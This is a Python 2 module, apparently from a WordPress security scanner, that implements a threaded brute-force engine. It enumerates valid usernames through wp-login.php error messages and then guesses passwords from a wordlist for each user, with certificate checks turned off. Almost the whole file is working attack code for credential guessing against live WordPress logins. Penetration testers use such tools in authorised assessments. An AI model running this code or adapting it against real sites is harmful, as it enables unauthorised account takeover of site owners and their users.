#!/usr/bin/python
# -*- coding: utf-8 -*-
import requests
import re
import json
import os
import urllib
import sys

from core import *
from wordpress import *
from thread_engine import ThreadEngine

class Brute_Engine:
	def __init__(self, wordpress, brute, usernames, users_list, passwords_list):
		# bruteforce customs users passed in --brute
		# ex: --brute admin,guest,foo
		if brute:
			if usernames:
				users_to_brute = usernames.split(',')
				for user in users_to_brute:
					user = user.replace(' ', '')
					print notice("Bruteforcing " + user)
					self.bruteforcing_pass(wordpress, user, passwords_list)

			# Bruteforce with usernames list
			elif users_list:
				for file_list in [users_list, passwords_list]:
					if not os.path.isfile(file_list):
						print critical("Can't found %s file" % file_list)
						exit()
				# launch users & passwords bruteforce
				self.bruteforcing_user(wordpress, users_list, passwords_list)


			# if users detected, bruteforce them
			else:
				if len(wordpress.users) != 0:
					if not os.path.isfile(passwords_list):
						print critical("Can't found %s file" % passwords_list)
						exit()

					print notice("Bruteforcing detected users: ")
					for user in wordpress.users:
						print info("User found "+ user['slug'])
						self.bruteforcing_pass(wordpress, user['slug'], passwords_list)


	"""
	name        : bruteforcing_user(self, wordpress)
	description :
	"""
	def bruteforcing_user(self, wordpress, users_list, passwords_list):
		print notice("Bruteforcing all users")

		with open(users_list) as data_file:
			data   = data_file.readlines()
			thread_engine = ThreadEngine(wordpress.max_threads)
			users_found = []

			for user in data:
				user = user.strip()
				thread_engine.new_task(self.check_user, (user, users_found, wordpress))
			thread_engine.wait()

			for user in users_found:
				self.bruteforcing_pass(wordpress, user, passwords_list)


	def check_user(self, user, users_found, wordpress):
		data = {"log":user, "pwd":"wordpresscan"}
		html = requests.post(wordpress.url + "wp-login.php", data=data, verify=False).text
		# valid login -> the submited user is printed by WP
		if '<div id="login_error">' in html and '<strong>%s</strong>' % user in html:
			print info("User found "+ user)
			users_found.append(user)


	"""
	name        : bruteforcing_pass(self, wordpress)
	description :
	"""
	def bruteforcing_pass(self, wordpress, user, passwords_list):
		print info("Starting passwords bruteforce for " + user)

		with open(passwords_list) as data_file:
			data  = data_file.readlines()
			size  = len(data)
			thread_engine = ThreadEngine(wordpress.max_threads)
			found = [False]

			for index, pwd in enumerate(data):
				if found[0]: break
				pwd     = pwd.strip()
				percent = int(float(index)/(size)*100)
				thread_engine.new_task(self.check_pass, (user, pwd, wordpress, found))

				# print 'Bruteforcing - {}{}\r'.format( percent*"▓", (100-percent)*'░' )
			thread_engine.wait()


	def check_pass(self, user, pwd, wordpress, found):
		data = {"log": user, "pwd": pwd}
		html = requests.post(wordpress.url + "wp-login.php", data=data, verify=False).text
		if not '<div id="login_error">' in html:
			print warning("Password found for {} : {}{}".format(user,pwd, ' '*100))
			found[0] = True
